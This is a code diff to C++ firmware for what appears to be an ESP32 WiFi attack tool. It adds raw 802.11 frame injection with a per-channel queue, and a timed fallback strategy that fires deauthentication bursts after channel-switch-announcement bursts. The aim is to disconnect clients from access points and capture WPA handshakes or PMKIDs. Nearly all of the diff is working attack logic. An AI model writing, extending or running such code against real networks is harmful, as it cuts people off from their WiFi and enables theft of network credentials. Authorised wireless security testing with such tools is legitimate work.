@@ -55,13 +55,14 @@ Politician::Politician()
       _fishSsidLen(0), _fishChannel(1),
       _fishAuthLogged(false), _fishAssocLogged(false),
       _csaSecondBurstSent(false),
-      _attackMask(ATTACK_ALL),
+      _attackMask(ATTACK_ALL), _disconnectStrategy(STRATEGY_AUTO_FALLBACK), _csaFallbackMs(0),
       _hasTarget(false), _targetChannel(1),
       _capturedCount(0)
 {
     _instance = this;
     memset(&_stats,           0, sizeof(_stats));
     memset(_attackOverrides,  0, sizeof(_attackOverrides));
+    memset(_injectQueue,      0, sizeof(_injectQueue));
     memset(_sessions,         0, sizeof(_sessions));
     memset(_apCache,     0, sizeof(_apCache));
     memset(_captured,    0, sizeof(_captured));
@@ -300,6 +301,50 @@ void Politician::clearTarget() {
     _log("[WiFi] Target cleared — wardriving mode\n");
 }
 
+Error Politician::injectCustomFrame(const uint8_t *payload, size_t len, uint8_t channel, uint32_t lock_ms, bool wait_for_channel) {
+    if (!_initialized) return ERR_NOT_ACTIVE;
+    if (len > 256) return ERR_WIFI_INIT; // Invalid length for queue
+    
+    if (!_lock || xSemaphoreTakeRecursive(_lock, pdMS_TO_TICKS(200)) != pdTRUE) return ERR_WIFI_INIT;
+    
+    if (!wait_for_channel) {
+        // Synchronous injection
+        esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
+        _channel = channel;
+        _rxChannel = channel;
+        _lastHopMs = millis();
+        esp_wifi_80211_tx(WIFI_IF_STA, (void*)payload, len, false);
+        _log("[Inject] Transmitted %d bytes on ch%d\n", (int)len, channel);
+        if (lock_ms > 0) {
+            // Temporarily lock the hopper for this duration
+            _m1Locked = true;
+            _m1LockEndMs = millis() + lock_ms;
+        }
+    } else {
+        // Asynchronous injection (queue)
+        bool queued = false;
+        for (int i = 0; i < MAX_INJECT_QUEUE; i++) {
+            if (!_injectQueue[i].active) {
+                _injectQueue[i].active = true;
+                _injectQueue[i].channel = channel;
+                _injectQueue[i].len = len;
+                _injectQueue[i].lock_ms = lock_ms;
+                memcpy(_injectQueue[i].payload, payload, len);
+                queued = true;
+                _log("[Inject] Queued %d bytes for ch%d\n", (int)len, channel);
+                break;
+            }
+        }
+        if (!queued) {
+            xSemaphoreGiveRecursive(_lock);
+            return ERR_WIFI_INIT; // Queue full
+        }
+    }
+    
+    xSemaphoreGiveRecursive(_lock);
+    return OK;
+}
+
 void Politician::setChannelList(const uint8_t *channels, uint8_t count) {
     if (count == 0 || channels == nullptr) {
         _customChannelCount = 0;
@@ -495,6 +540,19 @@ void Politician::tick() {
         _channel   = seq[_hopIndex];
         esp_wifi_set_channel(_channel, WIFI_SECOND_CHAN_NONE);
         _lastHopMs = now;
+        
+        // Process inject queue for the new channel
+        for (int i = 0; i < MAX_INJECT_QUEUE; i++) {
+            if (_injectQueue[i].active && _injectQueue[i].channel == _channel) {
+                esp_wifi_80211_tx(WIFI_IF_STA, (void*)_injectQueue[i].payload, _injectQueue[i].len, false);
+                _log("[Inject] Transmitted queued %d bytes on ch%d\n", _injectQueue[i].len, _channel);
+                _injectQueue[i].active = false;
+                if (_injectQueue[i].lock_ms > 0) {
+                    _m1Locked = true;
+                    _m1LockEndMs = millis() + _injectQueue[i].lock_ms;
+                }
+            }
+        }
     }
 
     xSemaphoreGiveRecursive(_lock);
@@ -878,7 +936,17 @@ void Politician::_handleMgmt(const ieee80211_hdr_t *hdr, const uint8_t *payload,
                 _csaSecondBurstSent = false;
                 if (effMask & ATTACK_CSA) _sendCsaBurst();
                 const uint8_t *known_sta = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
-                if (effMask & ATTACK_DEAUTH) _sendDeauthBurst((effMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, known_sta);
+                _csaFallbackMs = 0;
+                if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
+                    if (effMask & ATTACK_DEAUTH) _sendDeauthBurst((effMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, known_sta);
+                } else if (_disconnectStrategy == STRATEGY_AUTO_FALLBACK) {
+                    if ((effMask & ATTACK_CSA) && (effMask & ATTACK_DEAUTH)) {
+                        // Trigger fallback Deauth *before* the second CSA burst (which happens at 2000ms)
+                        _csaFallbackMs = millis() + 1000; 
+                    } else if (effMask & ATTACK_DEAUTH) {
+                        _sendDeauthBurst(_cfg.deauth_burst_count, known_sta);
+                    }
+                }
                 _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
                 _log("[Attack] Starting CSA/Deauth on %02X:%02X:%02X:%02X:%02X:%02X SSID=%.*s ch%d\n",
                     ap.bssid[0], ap.bssid[1], ap.bssid[2], ap.bssid[3], ap.bssid[4], ap.bssid[5], ap.ssid_len, ap.ssid, beacon_ch);
@@ -1236,8 +1304,18 @@ bool Politician::_parseEapol(const uint8_t *bssid, const uint8_t *sta,
                     _fishSsidLen = sess->ssid_len; _fishChannel = sess->channel; _fishStartMs = millis();
                     memcpy(_fishSta, sta, 6); // STA is known from the M2
                     _fishState = FISH_CSA_WAIT; _csaSecondBurstSent = false;
+                    _csaFallbackMs = 0;
                     if (_attackMask & ATTACK_CSA) _sendCsaBurst();
-                    if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, sta);
+                    if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
+                        if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst((_attackMask & ATTACK_CSA) ? _cfg.csa_deauth_count : _cfg.deauth_burst_count, sta);
+                    } else if (_disconnectStrategy == STRATEGY_AUTO_FALLBACK) {
+                        if ((_attackMask & ATTACK_CSA) && (_attackMask & ATTACK_DEAUTH)) {
+                            // Trigger fallback Deauth *before* the second CSA burst (which happens at 2000ms)
+                            _csaFallbackMs = millis() + 1000;
+                        } else if (_attackMask & ATTACK_DEAUTH) {
+                            _sendDeauthBurst(_cfg.deauth_burst_count, sta);
+                        }
+                    }
                     _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms;
                 }
             }
@@ -1747,11 +1825,21 @@ void Politician::_processFishing() {
     if (_fishState == FISH_IDLE) return;
     if (_fishState == FISH_CSA_WAIT) {
         if (_isCaptured(_fishBssid)) { _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis(); _log("[CSA] Captured!\n"); if (_autoTarget) { clearTarget(); _autoTargetActive = false; } return; }
+        
+        if (_disconnectStrategy == STRATEGY_AUTO_FALLBACK && _csaFallbackMs > 0 && millis() >= _csaFallbackMs) {
+            _csaFallbackMs = 0;
+            const uint8_t *known_sta2 = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
+            _sendDeauthBurst(_cfg.csa_deauth_count, known_sta2);
+            _log("[Attack] CSA fallback triggered — sending Deauth burst\n");
+        }
+
         if (!_csaSecondBurstSent && (millis() - _fishStartMs > 2000)) {
             _csaSecondBurstSent = true;
             if (_attackMask & ATTACK_CSA) _sendCsaBurst();
-            const uint8_t *known_sta2 = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
-            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count, known_sta2);
+            if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
+                const uint8_t *known_sta2 = (_fishSta[0] || _fishSta[1] || _fishSta[2]) ? _fishSta : nullptr;
+                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count, known_sta2);
+            }
             _log("[CSA] Burst 2\n");
         }
         if (millis() >= _probeLockEndMs) {
@@ -1789,8 +1877,18 @@ void Politician::_processFishing() {
         if (_attackMask & ATTACK_CSA) {
             _log("[Attack] Switching to CSA\n"); esp_wifi_set_channel(_fishChannel, WIFI_SECOND_CHAN_NONE);
             memset(_fishSta, 0, 6); // No known STA from PMKID path
+            _csaFallbackMs = 0;
             _sendCsaBurst();
-            if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
+            if (_disconnectStrategy == STRATEGY_SIMULTANEOUS) {
+                if (_attackMask & ATTACK_DEAUTH) _sendDeauthBurst(_cfg.csa_deauth_count);
+            } else if (_disconnectStrategy == STRATEGY_AUTO_FALLBACK) {
+                if ((_attackMask & ATTACK_CSA) && (_attackMask & ATTACK_DEAUTH)) {
+                    // Trigger fallback Deauth *before* the second CSA burst (which happens at 2000ms)
+                    _csaFallbackMs = millis() + 1000;
+                } else if (_attackMask & ATTACK_DEAUTH) {
+                    _sendDeauthBurst(_cfg.csa_deauth_count);
+                }
+            }
             _fishState = FISH_CSA_WAIT; _probeLocked = true; _probeLockEndMs = millis() + _cfg.csa_wait_ms; _csaSecondBurstSent = false;
         } else {
             _fishState = FISH_IDLE; _probeLocked = false; _lastHopMs = millis();
